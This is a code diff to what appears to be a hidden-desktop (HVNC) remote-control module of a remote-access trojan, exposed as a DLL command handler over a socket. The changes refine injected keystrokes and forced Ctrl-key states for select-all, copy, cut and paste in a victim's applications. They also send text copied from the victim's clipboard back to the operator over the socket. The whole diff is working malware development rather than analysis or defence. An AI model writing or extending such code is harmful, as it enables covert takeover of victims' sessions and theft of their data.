@@ -787,6 +787,12 @@ static bool send_mouse_input(int normX, int normY, DWORD flags, DWORD mouseData 
 static LPARAM key_lparam(WORD vk, bool keyUp) {
     UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
     LPARAM lp = 1 | (scan << 16);
+    if (vk == VK_RMENU || vk == VK_RCONTROL || vk == VK_INSERT || vk == VK_DELETE ||
+        vk == VK_HOME || vk == VK_END || vk == VK_PRIOR || vk == VK_NEXT ||
+        vk == VK_LEFT || vk == VK_RIGHT || vk == VK_UP || vk == VK_DOWN ||
+        vk == VK_DIVIDE || vk == VK_NUMLOCK) {
+        lp |= 0x01000000; // Extended key bit
+    }
     if (keyUp) lp |= 0xC0000000;
     return lp;
 }
@@ -934,12 +940,102 @@ static void input_loop() {
             if (!hTarget || !IsWindow(hTarget)) continue;
 
             if (action == "hvnc_keydown") {
-                PostMessageW(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false));
+                WPARAM wParam = vk;
+                if (vk == VK_LCONTROL || vk == VK_RCONTROL) wParam = VK_CONTROL;
+                else if (vk == VK_LMENU || vk == VK_RMENU) wParam = VK_MENU;
+                else if (vk == VK_LSHIFT || vk == VK_RSHIFT) wParam = VK_SHIFT;
+                PostMessageW(hTarget, WM_KEYDOWN, wParam, key_lparam((WORD)vk, false));
             } else if (action == "hvnc_keyup") {
-                PostMessageW(hTarget, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
+                WPARAM wParam = vk;
+                if (vk == VK_LCONTROL || vk == VK_RCONTROL) wParam = VK_CONTROL;
+                else if (vk == VK_LMENU || vk == VK_RMENU) wParam = VK_MENU;
+                else if (vk == VK_LSHIFT || vk == VK_RSHIFT) wParam = VK_SHIFT;
+                PostMessageW(hTarget, WM_KEYUP, wParam, key_lparam((WORD)vk, true));
             } else if (action == "hvnc_char") {
                 // Doğrudan WM_CHAR post et
                 PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);  // lParam genelde 1 (repeat count)
+            }
+            g_forceFullFrame = true;
+            continue;
+        }
+
+        if (action == "hvnc_selectall") {
+            HWND hTarget = GetFocusedWindow();
+            if (hTarget) {
+                DWORD tid = GetWindowThreadProcessId(hTarget, NULL);
+                AttachThreadInput(GetCurrentThreadId(), tid, TRUE);
+                SetFocus(hTarget);
+                BYTE keyState[256];
+                GetKeyboardState(keyState);
+                BYTE oldCtrl = keyState[VK_CONTROL];
+                keyState[VK_CONTROL] = 0x80;
+                SetKeyboardState(keyState);
+                SendMessageW(hTarget, WM_KEYDOWN, 'A', 0);
+                SendMessageW(hTarget, WM_KEYUP, 'A', 0xC0000000);
+                keyState[VK_CONTROL] = oldCtrl;
+                SetKeyboardState(keyState);
+                PostMessageW(hTarget, EM_SETSEL, 0, -1);
+                PostMessageW(hTarget, WM_COMMAND, 0xE122, 0);
+                AttachThreadInput(GetCurrentThreadId(), tid, FALSE);
+            }
+            g_forceFullFrame = true;
+            continue;
+        }
+
+        if (action == "hvnc_copy" || action == "hvnc_cut") {
+            HWND hTarget = GetFocusedWindow();
+            if (hTarget) {
+                DWORD tid = GetWindowThreadProcessId(hTarget, NULL);
+                AttachThreadInput(GetCurrentThreadId(), tid, TRUE);
+                SetFocus(hTarget);
+                BYTE keyState[256];
+                GetKeyboardState(keyState);
+                BYTE oldCtrl = keyState[VK_CONTROL];
+                keyState[VK_CONTROL] = 0x80;
+                SetKeyboardState(keyState);
+                WORD vk = (action == "hvnc_copy") ? 'C' : 'X';
+                SendMessageW(hTarget, WM_KEYDOWN, vk, 0);
+                SendMessageW(hTarget, WM_KEYUP, vk, 0xC0000000);
+                keyState[VK_CONTROL] = oldCtrl;
+                SetKeyboardState(keyState);
+                SendMessageW(hTarget, (action == "hvnc_copy") ? WM_COPY : WM_CUT, 0, 0);
+                AttachThreadInput(GetCurrentThreadId(), tid, FALSE);
+                thread([]() {
+                    Sleep(500);
+                    wstring text = get_clipboard_text();
+                    if (!text.empty()) {
+                        json resp;
+                        resp["action"] = "hvnc_clipboard";
+                        resp["text"] = wstring_to_utf8(text);
+                        safe_send_json(g_socket, resp);
+                    }
+                }).detach();
+            }
+            g_forceFullFrame = true;
+            continue;
+        }
+
+        if (action == "hvnc_paste") {
+            HWND hTarget = GetFocusedWindow();
+            if (hTarget) {
+                string text = cmd.value("text", "");
+                if (!text.empty()) {
+                    set_clipboard_text(utf8_to_wstring(text));
+                    DWORD tid = GetWindowThreadProcessId(hTarget, NULL);
+                    AttachThreadInput(GetCurrentThreadId(), tid, TRUE);
+                    SetFocus(hTarget);
+                    BYTE keyState[256];
+                    GetKeyboardState(keyState);
+                    BYTE oldCtrl = keyState[VK_CONTROL];
+                    keyState[VK_CONTROL] = 0x80;
+                    SetKeyboardState(keyState);
+                    SendMessageW(hTarget, WM_KEYDOWN, 'V', 0);
+                    SendMessageW(hTarget, WM_KEYUP, 'V', 0xC0000000);
+                    keyState[VK_CONTROL] = oldCtrl;
+                    SetKeyboardState(keyState);
+                    PostMessageW(hTarget, WM_PASTE, 0, 0);
+                    AttachThreadInput(GetCurrentThreadId(), tid, FALSE);
+                }
             }
             g_forceFullFrame = true;
             continue;
@@ -1448,40 +1544,14 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     send_error("Failed to start process. Error: " + to_string(GetLastError()));
                 }
             }
-        } else if (action == "hvnc_selectall") {
-            HWND hTarget = GetFocusedWindow();
-            if (hTarget) {
-                PostMessageW(hTarget, EM_SETSEL, 0, -1);
-                PostMessageW(hTarget, WM_COMMAND, 0xE122, 0);
-            }
-        } else if (action == "hvnc_copy" || action == "hvnc_cut") {
-            HWND hTarget = GetFocusedWindow();
-            if (hTarget) {
-                SendMessageW(hTarget, (action == "hvnc_copy") ? WM_COPY : WM_CUT, 0, 0);
-                thread([]() {
-                    Sleep(200);
-                    wstring text = get_clipboard_text();
-                    if (!text.empty()) {
-                        json resp;
-                        resp["action"] = "hvnc_clipboard";
-                        resp["text"] = wstring_to_utf8(text);
-                        safe_send_json(g_socket, resp);
-                    }
-                }).detach();
-            }
-        } else if (action == "hvnc_paste") {
-            HWND hTarget = GetFocusedWindow();
-            if (hTarget) {
-                string text = cmd.value("text", "");
-                if (!text.empty()) {
-                    set_clipboard_text(utf8_to_wstring(text));
-                    PostMessageW(hTarget, WM_PASTE, 0, 0);
-                }
-            }
         } else if (action.find("hvnc_mouse") != string::npos ||
                    action.find("hvnc_key")   != string::npos ||
                    action == "hvnc_char" ||
-                   action == "hvnc_doubleclick") {
+                   action == "hvnc_doubleclick" ||
+                   action == "hvnc_selectall" ||
+                   action == "hvnc_copy" ||
+                   action == "hvnc_cut" ||
+                   action == "hvnc_paste") {
             lock_guard<mutex> lock(g_inputMutex);
             g_inputQueue.push({action, cmd});
             g_inputCV.notify_one();
